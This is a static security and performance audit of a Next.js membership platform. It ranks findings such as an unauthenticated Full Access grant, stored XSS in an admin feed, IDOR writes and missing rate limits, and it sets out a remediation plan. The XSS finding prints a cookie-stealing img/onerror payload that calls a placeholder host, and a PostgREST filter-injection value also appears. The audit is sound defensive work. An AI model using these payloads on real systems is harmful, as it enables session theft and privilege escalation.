# Sequence — Security & Performance Audit

**Date:** 2026-07-03
**Scope:** Full read-only static analysis of the deployed Next.js 16 app (`src/`), plus a pass over `scripts/` and `tools/`. Nothing was modified or executed. 44 API route handlers, middleware, content layer, AI endpoints, email, Stripe, and the public/portal render paths were reviewed.
**Method:** Six parallel focus areas — API authz/IDOR, user-input & injection, HTML rendering/XSS, cryptography/secrets/webhooks, payload limits/DoS, and runtime performance — cross-checked against direct file reads.

---

## 1. Executive summary

The platform's **foundational security primitives are correct**: Stripe webhook signatures are properly verified, all 16 `/api/admin/**` routes enforce a real `profiles.role === 'admin'` check (not just "logged in"), most member routes are correctly scoped by `user.id`, RLS backs the bookmarks route, no secrets are committed or exposed via `NEXT_PUBLIC_`, and there is **no command-injection, `eval`, or SQL-injection surface** in the deployed app. Crypto usage is minimal and modern (no MD5/SHA1/DES; WebCrypto HMAC-SHA256; TLS everywhere).

The problems cluster in **four systemic gaps**, all fixable without architectural change:

1. **No rate limiting exists anywhere.** Every expensive AI endpoint and every public email-sending endpoint is callable in an unbounded loop. This is the single largest exposure — a denial-of-wallet vector against the Anthropic and Resend bills, plus a brute-force oracle on discount codes.
2. **A handful of privileged endpoints trust client-supplied identity or skip a role check** — `codes/redeem` (provision Full Access to any user id), `regenerate-all` (missing admin gate), and a cluster of IDOR writes that mutate other users' data through the service-role client with an id-only filter.
3. **Two HTML-rendering sinks are unescaped** — the admin activity feed (member-triggerable stored XSS aimed at admins) and four transactional email templates.
4. **No caching or image optimization on the content layer** — every content page re-reads and re-parses 100+ MDX files, and 200+ full-resolution remote images load with no `next/image`.

Nothing here is a currently-exploited breach, but items **C1, H1, H2, and H4** should be treated as near-term must-fix.

### Severity roll-up

| # | Severity | Area | One-line |
|---|----------|------|----------|
| C1 | **Critical** | Authz | `codes/redeem` provisions Full Access to a client-supplied `user_id` with no session |
| H1 | **High** | XSS | Stored XSS in admin activity feed via member `full_name` → `dangerouslySetInnerHTML` |
| H2 | **High** | Authz | `regenerate-all` missing admin check → any member triggers fleet-wide Claude spend |
| H3 | **High** | IDOR | Service-role writes filtered by id only → cross-user overwrite of chats, conversations, deal evals |
| H4 | **High** | DoS/cost | No rate limiting on any endpoint → AI cost-DoS, email bomb, code brute-force |
| M1 | Medium | Limits | No request body size limit / no input length caps before Claude prompts |
| M2 | Medium | Authz | Stripe checkout applies an unvalidated client `couponId` |
| M3 | Medium | Injection | Contact form interpolates unescaped input into outbound email HTML |
| M4 | Medium | XSS | 4 email templates interpolate unescaped public `name` |
| M5 | Medium | Injection | PostgREST `.or()` filter injection in admin search/members (admin-gated) |
| L1 | Low | Crypto | Unsubscribe HMAC falls back to a source-committed `"fallback-secret"` |
| L2 | Low | XSS | `javascript:` href not blocked in advisor-chat markdown links |
| L3 | Low | Reliability | `newsletter/send` unbounded `select` + no `maxDuration` |
| L4 | Low | Hardening | No security response headers / CSP |
| I1 | Info | Dev tool | `image-sourcer` localhost server: path traversal + SSRF, binds `0.0.0.0` (not deployed) |
| P-H1 | **High (perf)** | Images | 200+ raw remote `<img>`, no `next/image`, no image optimization |
| P-H2 | **High (perf)** | Content | `content.ts` has zero caching — re-reads/parses all MDX per request |
| P-M1 | Medium (perf) | Caching | Unnecessary `force-dynamic` on `/platform`; cosmetic shuffle forces it on `/the-library` |
| P-M2 | Medium (perf) | Bundle | Portal case-studies page ships all 106 studies' full frontmatter to the client |
| P-M3 | Medium (perf) | Assets | 26 MB hero mp4 + 1.4–2.2 MB testimonial JPEGs unoptimized |
| P-L1/L2 | Low (perf) | Queries | Dashboard double `getUser()` + minor sequential-await waterfalls |

---

## 2. Security findings (detail)

### C1 — `codes/redeem` provisions Full Access to an arbitrary user id
**File:** `src/app/api/codes/redeem/route.ts:34-39, 88-104`

When there is no authenticated session the handler falls back to `signupUserId`/`signupEmail` **from the request body**:

```ts
const userId    = user?.id    || signupUserId;   // client-controlled
const userEmail = user?.email || signupEmail;    // client-controlled
```

On a valid 100%-off code it then upserts `plan: "full_access", status: "active"` for that raw UUID and flips `profiles.status = 'active'`. Nothing proves the caller owns the id/email.

**Exploit:** an unauthenticated attacker who knows (or brute-forces — see H4) one valid Friends & Family code can grant permanent Full Access to any account UUID they name, or repeatedly provision fabricated redemptions up to the code's `max_uses`.

**Why it's Critical:** unauthenticated → paid-tier privilege grant, and it's amplified by the fact that `codes/validate` is a public, unthrottled oracle (H4) that leaks `is_full_discount`/`plan_granted`.

---

### H1 — Stored XSS in the admin activity feed
**Sink:** `src/app/(admin)/admin/page.tsx:237` — `<div dangerouslySetInnerHTML={{ __html: a.text }} />`
**Source:** `src/app/api/admin/activity/route.ts:74, 88, 100, 114, 126` — builds `text` by interpolating member data into an HTML string with no escaping, e.g. `` `<strong>${name}</strong> signed up …` `` where `name = profiles.full_name`.
**Injection point:** `full_name` is set by any member in Settings and saved raw (`src/components/portal/settings-form.tsx:180`), with no sanitization.

**Exploit:** a member sets their display name to `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">`. On their next signup/cancel/assessment-completion event the payload lands in the admin activity feed and executes **in the admin's browser** when the admin opens `/admin` — a low-privilege member planting script that fires in the highest-privilege session. `recipient_email` (payment-failed / email-failed rows) is a second vector.

*(The only other `dangerouslySetInnerHTML` in the app — `case-study-header.tsx:86` — renders team-authored MDX frontmatter and is safe under the current authoring model.)*

---

### H2 — `regenerate-all` has no admin role check
**File:** `src/app/api/assessment/regenerate-all/route.ts:16`

The handler checks `if (!user)` only — no `requireAdmin()`. It then loads **every** published `strategic_plans` row across **all** users, flips them to `generating`, and runs a Claude regeneration per plan in a loop.

**Exploit:** any logged-in member POSTs once and triggers a Claude call for every user's plan platform-wide (mass Anthropic spend) while clobbering everyone's roadmap display state. The file comment literally says "TEMP admin endpoint." Nothing in the app calls it.

---

### H3 — IDOR: cross-user writes through the service-role client (systemic)
Root cause: several mutations use the **service-role admin client** (which bypasses RLS) filtered by a **client-supplied row id only**, dropping the ownership check a normal RLS client would enforce for free.

- **Advisor chat history overwrite** — `src/app/api/advisor/chat/route.ts:129,166` → `saveConversationMessages()` in `src/lib/advisor/message-store.ts:55-85` (`.eq("id", conversationId)` only). Attacker passes a victim's `conversationId`; on `onFinish` the victim's history is replaced.
- **Advisor conversation rename/delete** — `src/app/api/advisor/conversations/route.ts` PATCH/DELETE → `renameConversation`/`deleteConversation` (`message-store.ts:158-178`, id-only). Delete or rename another member's conversations.
- **Deal-evaluation overwrite** — `src/app/api/evaluator/complete/route.ts:102-103` — `admin.from('deal_evaluations').update(evalData).eq('id', evalId)`, `evalId` from the body, no `user_id` scope.

**Fix pattern (all three):** add `.eq("user_id", user.id)` to every admin-client mutation that takes a client-supplied row id, or verify ownership first.

---

### H4 — No rate limiting anywhere (cost-DoS / brute-force / email bomb)
Grep for `ratelimit|upstash|throttle|limiter` returns **zero** hits. Middleware only refreshes the Supabase session.

- **AI cost-DoS (worst):** the five AI routes each fire a `claude-sonnet` call at `max_tokens: 16000` + adaptive thinking, `maxDuration: 300`. `POST /api/inventory/analyze` takes **no body** (reads items from the DB) and chains **two** Claude calls (analysis + roadmap regen). A single member scripting a loop drives unbounded Anthropic spend and holds 300s function slots (concurrency exhaustion). `advisor/chat` allows up to 10 tool-loop steps per message — the highest $/sec vector.
- **Code brute-force:** `codes/validate` (public, unthrottled) is an enumeration oracle; a discovered 100%-off code feeds C1.
- **Email bomb:** `contact`, `newsletter/subscribe`, and `book/download` each send a Resend email to an attacker-supplied address with no throttle — mail-bombing third parties + burning Resend quota + reputation damage.

---

### M1 — No body size limit; no input length caps before Claude
`next.config.ts` sets no `bodySizeLimit`; App-Router handlers have no default cap beyond the ~4.5 MB platform ceiling. `grep -rln maxLength src/` returns **nothing** — not a single length cap in the frontend. Inventory item fields (`asset_name`/`description`/`notes`) are written client-side with only `.trim()` and then interpolated raw into the prompt (`inventory/analyze/route.ts:151-157`); evaluator `answers`/`scores` are `JSON.stringify`'d into the prompt unbounded. A member pasting 500 KB inflates input tokens (cost) and can trip context limits.

### M2 — Unvalidated Stripe `couponId`
`src/app/api/stripe/checkout/route.ts:160` — `sessionConfig.discounts = [{ coupon: couponId }]` applies any client-supplied coupon id with no server-side revalidation against `discount_codes`/`university_codes` (bypasses `active`/`expires_at`/`max_uses`). University coupon ids are discoverable via the public `codes/validate`.

### M3 — Contact-form HTML injection / email relay
`src/app/api/contact/route.ts:32-47` — `name`/`email`/`subject`/`message` are interpolated **unescaped** into the outbound email HTML and `email` becomes `replyTo`. Recipient is hardcoded (not an open relay), but the body allows arbitrary markup/phishing content into the team inbox, and there's no format/length validation or throttle. (Resend takes structured fields, so raw `\r\n` header smuggling is not reachable — the risk is HTML-body injection + spam.)

### M4 — Unescaped `name` in 4 email templates
`welcome.ts`, `payment-failed.ts`, `newsletter-welcome.ts`, `book-delivery.ts` interpolate `firstName` raw into the HTML body. For `newsletter/subscribe` and `book/download`, `name` comes from an **unauthenticated public POST body**, so an attacker fully controls injected markup delivered to the recipient's mail client (in-brand phishing; stored XSS in HTML-permissive webmail).

### M5 — PostgREST `.or()` filter injection (admin-gated)
`src/app/api/admin/search/route.ts:24,43,62` and `admin/members/route.ts:35` build `.or(`full_name.ilike.%${q}%,email.ilike.%${q}%`)` from a raw query param. In PostgREST the `,` `(` `)` and column names inside `.or()` are *structural*, not parameterized — a value like `?q=x,role.eq.admin` can restructure the filter. Bounded by the admin-only gate, so this is a privilege-consistency issue rather than anonymous exfiltration, but the injectable pattern is real.

### L1 — Unsubscribe HMAC fallback secret
`src/app/api/newsletter/unsubscribe/route.ts:39` — `const secret = process.env.RESEND_API_KEY || "fallback-secret"`. If `RESEND_API_KEY` is ever unset, every unsubscribe token is signed with the source-committed literal, making tokens forgeable for any email. Also: reusing a live third-party API key as an HMAC signing key is poor key hygiene. The construction (WebCrypto HMAC-SHA256, 128-bit truncated tag) is otherwise sound; comparison is a plain `!==` (non-constant-time, not practically exploitable with a strong key).

### L2 — `javascript:` href in advisor chat
`src/components/advisor/chat/chat-message.tsx:206-208` — markdown links `[text](url)` from Claude output render as `<a href={url}>` with no scheme allowlist (only `/library/...` prefixes are special-cased). A prompt-injected/poisoned response emitting `[click](javascript:…)` yields a clickable script href in the member's own session. Requires poisoned output + a click, hence Low. (The rest of the chat renderer builds React nodes — AI text itself can't inject markup.)

### L3 — `newsletter/send` unbounded select + no `maxDuration`
`src/app/api/newsletter/send/route.ts:73-78,99,121` loads **all** active subscribers into memory (no `.range()`/`.limit()`) and serial-sends with no `export const maxDuration`. Admin-gated, but it will time out / OOM as the list grows.

### L4 — No security headers / CSP
No `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options`, `X-Content-Type-Options`, or `Referrer-Policy` are set (checked `next.config.ts` + middleware). A CSP in particular would provide defense-in-depth against H1/M4.

### Not a finding (verified good) / accurately downgraded
- **Open redirect via `next=`** (`auth/callback`): **not practically exploitable** — `origin` is always prepended (`${origin}${next}`), so `//evil.com` becomes an on-origin path. Residual: `x-forwarded-host` is trusted for the redirect host, but that header is set by the platform proxy, not the client. Low/info.
- **Stripe webhook replay:** no processed-event-id ledger, but signatures carry a timestamp (SDK enforces a 5-min tolerance) and upserts are idempotent (`onConflict: user_id`). Info only.
- **Prompt injection into Claude:** untrusted input stays in the **user turn** (not the system prompt), and AI output is rendered as escaped React text (not `dangerouslySetInnerHTML`); provider URLs are whitelist-filtered. Contained — no action.
- **Command execution / SQL injection:** none in the deployed app.
- **`I1` — `tools/image-sourcer` localhost dev server:** genuine path traversal (unsanitized `slug` → `path.join`) and SSRF (`fetch(userInput)`), unauthenticated, and `app.listen(PORT)` binds all interfaces (LAN-reachable while running). **Dev-tool scope only — not deployed to Vercel.** Worth a `127.0.0.1` bind + slug sanitization if it's ever run on an untrusted network, but not production-facing.

---

## 3. Performance findings (detail)

### P-H1 — No image optimization (200+ raw remote images)
`next.config.ts` has **no `images` block** and `next/image` is imported **0 times** — every image is a raw `<img>`. Case-study heroes/covers are 200+ third-party CDN URLs (`s.wsj.net`, `i.ytimg.com`, etc.) rendered at `case-study-header.tsx:105` (the LCP element, no dimensions/`fetchpriority`) and `lib-card.tsx:44`. Full-resolution, no WebP/AVIF, no resize, on every card grid and detail page. This is the biggest LCP/bandwidth lever and also the cause of the recurring hotlink-block breakage (commit `0b38226`).

### P-H2 — `content.ts` has zero caching
`readDir()` (`src/lib/content.ts:125-136`) does `fs.readdirSync` + `fs.readFileSync` + `gray-matter` parse for every file on every call, with no `React.cache()`, module memo, or `unstable_cache`. Callers invoke it several times per render (`dashboard/page.tsx:44-45,336-338`, `getNewContentCount()` at `content.ts:313-321`), and `getAllCaseStudies` re-runs `validateCaseStudyTaxonomy` per file per call — 150–300+ synchronous fs reads + YAML parses blocking each dashboard/library render, repeated on every request on `force-dynamic` pages.

### P-M1 — Unnecessary `force-dynamic`
`(public)/platform/page.tsx:82` is `force-dynamic` but renders only static preview data + testimonials — no reason to be dynamic. `(public)/the-library/page.tsx:16` is `force-dynamic` solely because `getFeaturedCaseStudies()` uses `Math.random()` shuffle (`content.ts:243-249`) — a cosmetic reason paying full SSR cost per visit. *(The portal `settings` / `admin` force-dynamic are correct — leave them.)*

### P-M2 — Portal case-studies ships full corpus to the client
`(portal)/library/case-studies/page.tsx:6,17` passes the entire `getAllCaseStudies()` result (106 objects incl. `excerpt`/`stats`/`sections`/`tags`/image URLs) into the `"use client"` sidebar. The whole catalog's metadata is serialized into the RSC/JS payload; grows linearly with the catalog.

### P-M3 — Large unoptimized media
`public/videos/SEQ-TemiCoker-90sec-v1.mp4` is **26 MB**; testimonial JPEGs are 1.4–2.2 MB each (`testimonials-carousel.tsx:81`). The hero video itself is handled well (`poster` + `preload="metadata"` in `hero-video.tsx`); confirm the 26 MB file isn't referenced on first paint.

### P-L1 / P-L2 — Minor query waterfalls
`dashboard/page.tsx:523` calls `getUser()` then `FullAccessDashboard` calls it again (`:47`); the standalone `profiles` query (`:78`) runs before an otherwise-well-batched `Promise.all`. `roadmap/page.tsx:108` runs an independent `recentDeals` query after `actions` (`:96`) — could `Promise.all`. Polish, not hotspots. **No N+1 patterns exist** — admin routes use `.in()` + `Promise.all` + in-memory aggregation and are paginated.

---

## 4. Remediation plan (tiered — simple → complex, with tradeoffs)

Priorities below are ordered by (impact × ease). Each item lists a **quick** option and a **robust** option where they differ.

### Phase 0 — Immediate, low-effort, high-impact (hours)
These are small, surgical, and close the worst holes.

1. **H2 — gate `regenerate-all`.**
   - *Quick:* add `requireAdmin()` at the top (one line; the helper already exists at `src/lib/supabase/admin.ts:34`).
   - *Simplest of all:* delete the endpoint — nothing calls it.
   - *Tradeoff:* deleting is safest (removes the surface entirely) but loses the admin convenience; gating keeps it. **Recommend delete** unless admin uses it.

2. **H1 — stop the admin XSS.**
   - *Quick + correct:* HTML-escape the interpolated values in `admin/activity/route.ts` (a 5-line `escapeHtml()` on `name`/`recipient_email`).
   - *More robust:* stop building HTML strings in the API and render the feed as plain React text nodes in `admin/page.tsx:237` (removes `dangerouslySetInnerHTML` entirely). Requires restructuring `text` into `{name, verb, plan}` fields.
   - *Tradeoff:* escaping is a one-file fix; the React-node refactor is the durable pattern but touches the component. **Do the escape now, schedule the refactor.** Also add input sanitization/length cap on `full_name` at write (`settings-form.tsx`).

3. **C1 — require a real session in `codes/redeem`.**
   - *Quick:* drop the `signupUserId`/`signupEmail` body fallback; require `user` from the session (return 401 otherwise). If the F&F flow genuinely redeems pre-confirmation, verify the supplied id against the just-created pending auth row via service role before provisioning.
   - *Tradeoff:* may require a small change to the signup→redeem client flow if it currently redeems before login. Worth it — this is the critical one.

4. **H3 — scope the IDOR writes.** Add `.eq("user_id", user.id)` to `saveConversationMessages`, `renameConversation`, `deleteConversation`, `linkAssessmentToConversation` (`message-store.ts`) and the `deal_evaluations` update (`evaluator/complete/route.ts:102`). Pass `userId` into the store functions.
   - *Tradeoff:* none meaningful — pure hardening. Low effort.

5. **M2 — validate `couponId`** server-side in `stripe/checkout` against `discount_codes`/`university_codes` (active/unexpired/under max_uses) before attaching, or use Stripe promotion codes and drop the raw coupon path.

6. **M3 / M4 — escape email interpolation.** Add one shared `escapeHtml()` and apply to contact-form fields and the 4 email templates' `firstName`. Add basic length caps + email-format validation on `contact`/`subscribe`.

7. **L1 — remove the `"fallback-secret"`.** Fail closed (throw) if the signing secret env var is missing; move to a dedicated `NEWSLETTER_TOKEN_SECRET` rather than reusing `RESEND_API_KEY`.

### Phase 1 — Rate limiting & input bounds (days) — **the biggest risk reduction**
This is item **H4 + M1** and deserves its own phase because it's cross-cutting.

- **Option A (quick, no new infra):** a lightweight per-user counter in Postgres/Supabase — an `ai_usage` row incremented per call with an "N generations per user per hour" check at the top of the five AI routes, and an IP+email throttle table for the public email/code routes. Cheap; survives a single serverless instance because state is in the DB.
  - *Tradeoff:* a DB round-trip per request; coarser than a true sliding window; you build/maintain it.
- **Option B (robust, recommended):** `@upstash/ratelimit` + Upstash Redis — a sliding-window limiter in ~10 lines per route, plus one in middleware for the public routes. Purpose-built, distributed, negligible latency.
  - *Tradeoff:* adds an Upstash dependency + a small monthly cost. For a paid product with real Anthropic/Resend bills, this is the right call.
- **Option C (defense-in-depth, cheap):** Vercel WAF / platform rate rules on the specific paths (`/api/inventory/analyze`, `/api/advisor/chat`, `/api/codes/validate`, `/api/contact`). Complements A or B; not a substitute (no per-user granularity).
- **Input bounds (do regardless):** add `maxLength` to the inventory/evaluator textareas **and** a server-side truncation before the prompt is assembled (`inventory/analyze/route.ts:151`, `evaluator/complete`), plus a cap on `advisor/chat` message count/size. Add a global body-size guard. Low effort, directly caps token cost.

**Recommendation:** Option B for AI + public routes, plus the input bounds. If you want zero new infra this week, Option A on the five AI routes + `codes/validate` closes 80% of the exposure.

### Phase 2 — Defense-in-depth & the remaining mediums (days)
- **L4 — add security headers** via `next.config.ts` `headers()` or middleware: `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` (or `frame-ancestors` CSP), `Referrer-Policy`. Then a **CSP** — start in `Content-Security-Policy-Report-Only` to avoid breaking Spline/PostHog/Stripe/Supabase, tune the allowlist, then enforce. A CSP is the strongest backstop for H1/M4/L2.
  - *Tradeoff:* CSP tuning takes iteration with the third-party embeds (Spline, PostHog reverse-proxy, Stripe.js). Report-Only first de-risks it.
- **M5 — escape PostgREST filter input** in admin search/members (strip/escape `%,()\\` in `q`, or build the `.or()` from sanitized fragments).
- **L2 — allowlist link schemes** in `chat-message.tsx` (permit `http:`/`https:`/relative; reject `javascript:`/`data:`).
- **L3 — paginate/batch `newsletter/send`** and add `export const maxDuration`.

### Phase 3 — Performance (days)
- **P-H2 (do first — smallest effort, every page benefits):** wrap `readDir`/`getAll*` in `React.cache()` for per-request dedup **and** a module-level memo keyed by subdir (content changes only at deploy). Turns 150–300 fs reads per render into one.
- **P-M1:** remove `force-dynamic` from `/platform`; move the `/the-library` shuffle client-side (or accept periodic `revalidate`) so the page can be static/ISR. Trivial, immediate TTFB win.
- **P-M2:** project case-study objects to only the fields the sidebar/cards need before passing to the client component. Low effort, meaningful JS payload cut.
- **P-H1 (largest, stage it):**
  - *Quick partial:* add `loading="lazy"` to `lib-card` covers and explicit `width`/`height` + `fetchpriority="high"` to the case-study hero. Hours; real CLS/LCP improvement, no infra change.
  - *Robust:* adopt `next/image`. But allowlisting 200+ external hosts via `remotePatterns` is unbounded and fragile — the **durable** path is to **self-host hero/cover images** (download to the existing SSD/Supabase storage, serve locally), which also fixes the recurring hotlink breakage. Larger effort; highest payoff.
- **P-M3:** compress testimonial JPEGs to ~150 KB; confirm the 26 MB mp4 isn't on the first-paint path.
- **P-L1/L2:** pass `user` down instead of re-fetching; fold independent queries into `Promise.all`. Polish.

### Suggested sequencing
1. **This week:** Phase 0 (all seven items are small) + Phase 1 Option A or B on the AI routes and `codes/validate`. Closes C1/H1/H2/H3/H4.
2. **Next:** finish Phase 1 input bounds, Phase 2 headers + CSP (Report-Only), Phase 3 P-H2 + P-M1 (cheap, high-value).
3. **Then:** the image strategy (P-H1) as a dedicated task, and the remaining polish.

---

## 5. Appendix — what was verified clean
- Stripe webhook signature verification (raw body, verified before any mutation).
- All 16 `/api/admin/**` routes enforce `requireAdmin()` (real role check, not middleware-dependent — middleware does **not** gate `/api/*`).
- User-scoped routes: `inventory/*`, `assessment/*` (except `regenerate-all`), `roadmap/refresh`, `stripe/portal`, `debug/creative-identity`, `bookmarks` (RLS).
- No committed secrets; no secret in any `NEXT_PUBLIC_` var; service-role/Anthropic keys never referenced in client components.
- No MD5/SHA1/DES/RC4; no `Math.random()` for security tokens; TLS for all external calls.
- No command injection, `eval`, `vm`, dynamic import, or SQL injection in the deployed app.
- No user-submitted MDX path; the MDX pipeline only renders team-authored `content/*.mdx`.
- No N+1 query patterns; admin lists paginate; PDF/Anthropic SDKs are server-only.
